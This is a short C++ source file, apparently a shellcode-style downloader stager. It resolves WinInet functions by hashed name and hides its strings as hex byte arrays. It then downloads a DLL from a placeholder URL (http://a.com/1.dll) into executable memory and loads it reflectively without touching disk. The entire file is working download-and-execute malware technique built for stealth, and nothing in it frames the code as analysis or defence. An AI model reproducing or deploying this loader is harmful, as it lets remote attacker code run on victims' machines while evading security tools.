/*
	Author: y11en
	Data: 2020.4
*/

#include "one.h"
#include "sc.h"
#include <WinInet.h>

using T_InternetOpenA = decltype(&InternetOpenA);
#define H_InternetOpenA 0x08c4b642

using T_InternetConnectA = decltype(&InternetConnectA);
#define H_InternetConnectA 0x3dcc5088

using T_InternetCloseHandle = decltype(&InternetCloseHandle);
#define H_InternetCloseHandle 0x35315a4f

using T_InternetReadFile = decltype(&InternetReadFile);
#define H_InternetReadFile 0x3461af2f

using T_InternetOpenUrlA = decltype(&InternetOpenUrlA);
#define H_InternetOpenUrlA 0x317c5599

// ~ 1150
void* sc_netexec()
{
	NativeApi func;

	T_InternetOpenA open_net;
	T_InternetOpenUrlA open_url;
	T_InternetCloseHandle close_h;
	T_InternetReadFile hread;

	HINTERNET net_handler, net_session;
	HMODULE wininet;

	VOID* buff;
	DWORD dwWrite;

	char str_ua[] = { 'a', 0x00 };
	char wininet_dll[] = { 0x77, 0x69, 0x6E, 0x69, 0x6E, 0x65, 0x74, 0x2E, 0x64, 0x6C, 0x6C , 0x00 };

	// http://a.com/1.dll
	char str_url[] = { 0x68, 0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 0x61,
	0x2E, 0x63, 0x6F, 0x6D, 0x2F, 0x31, 0x2E, 0x64,
	0x6C, 0x6C , 0x00};

	init_api(&func);

	wininet = func.loadlib(wininet_dll);

	GET_FUNC(wininet, H_InternetOpenA, open_net, func.getproc);
	GET_FUNC(wininet, H_InternetOpenUrlA, open_url, func.getproc);
	GET_FUNC(wininet, H_InternetCloseHandle, close_h, func.getproc);
	GET_FUNC(wininet, H_InternetReadFile, hread, func.getproc);


	net_handler = open_net(str_ua, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, INTERNET_FLAG_NO_CACHE_WRITE);
	net_session = open_url(net_handler, str_url, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
	
	buff = func.allocmem(0, 1024 * 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	hread(net_session, buff, 1024 * 1024, &dwWrite);

	return mem_loaddll(&func, buff, 0, 0, 0);
}


